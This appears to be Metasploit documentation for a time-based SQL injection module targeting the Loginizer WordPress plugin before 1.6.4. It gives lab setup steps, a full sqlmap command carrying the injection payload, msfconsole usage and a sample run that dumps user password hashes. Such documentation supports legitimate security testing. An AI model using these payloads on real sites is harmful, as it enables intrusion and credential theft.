## Vulnerable Application

Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in
versions before 1.6.4.  The vulnerable parameter is in the `log` parameter.

Exploitation requires Wordpress after [a87271af60113d46ab3866b1e525a1817bce742d](https://github.com/WordPress/WordPress/commit/a87271af60113d46ab3866b1e525a1817bce742d#diff-05003928101dd60650a6864173792d6fbaaccbd26820d99dbcfff47c5f61322e)

* 5.4 or newer
* 5.5 or newer

Attempts to exploit non-vulnerable versions will likely cause loginizer's blacklist to ban the metasploit IP.

Wordpress has forced updates of the plugin to all servers.  To test this exploit, the server
must not have a connection to the internet.

All versions can be downloaded from [wordress.org](https://wordpress.org/plugins/loginizer/advanced/)
or [1.6.3](https://downloads.wordpress.org/plugin/loginizer.1.6.3.zip)

This module slightly replicates sqlmap running as:

```
python3 sqlmap.py -u http://local.target/wp-login.php --method='POST' --data='log=&pwd=password&wp-submit=Log+In&redirect_to=&testcookie=1' -p log --prefix="', ip = LEFT(UUID(), 8), url = ( TRUE " --suffix=") -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db
```

## Verification Steps

1. Disconnect the server from the internet
1. Install the plugin on wordpress
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_loginizer_log_sqli`
1. Do: `set action [action]`
1. Do: `run`

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

### COUNT

If Action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `1`.

## Scenarios

### Wordpress 5.4.2 with Loginizer 1.6.3 on Ubuntu 20.04 using MariaDB 10.3.22

#### List Users

```
resource (loginizer.rb)> use auxiliary/scanner/http/wp_loginizer_log_sqli
resource (loginizer.rb)> set verbose true
verbose => true
resource (loginizer.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/wp_loginizer_log_sqli) > set count 3
count => 3
msf6 auxiliary(scanner/http/wp_loginizer_log_sqli) > run

[*] Checking /wp-content/plugins/loginizer/readme.txt
[*] Found version 1.6.3 in the plugin
[+] Vulnerable version detected
[*] {SQLi} Executing (select group_concat(XMjgCKOLn) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) XMjgCKOLn from wp_users limit 3) ZtmrJNCuJ)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTJmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
